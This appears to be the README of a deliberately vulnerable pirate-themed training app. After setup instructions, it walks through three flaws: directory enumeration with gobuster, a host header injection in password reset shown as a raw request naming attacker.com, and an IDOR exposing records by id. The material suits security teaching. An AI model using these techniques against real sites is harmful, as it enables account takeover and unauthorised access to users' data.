# Pirate-themed Vulnerable App

This app is intentionally vulnerable!

# How to Run

* Install the Python dependencies: 
    - `pipenv shell`
    - `pipenv install`
* Run the Python API via `python3 app.py`
* Run Nginx via `docker run --name my-nginx -p 80:80 -v ./nginx.conf:/etc/nginx/nginx.conf:ro -d nginx`

# Vulnerability 1: Exposed Files

* We run `gobuster dir -u http://localhost -w ./wordlists/1.txt` 
* Looking at the output, we find `/pirates` exposed
* We visit `http://localhost/pirates` and find `http://localhost/pirates/treasure.txt`

# Vulnerability 2: Host Header Injection in Password Reset

* Send a `POST` request like:

```
POST /reset-password HTTP/1.1
Host: attacker.com
Content-Length: 25

{"email":"test@test.com"}
```

# Vulnerability 3: IDOR

* Check out the 'Loot' functionality and realize that you can access, without authentication, any loot if you know the `id`
* Check out the `production.log` again and find the `id` of the `admin` user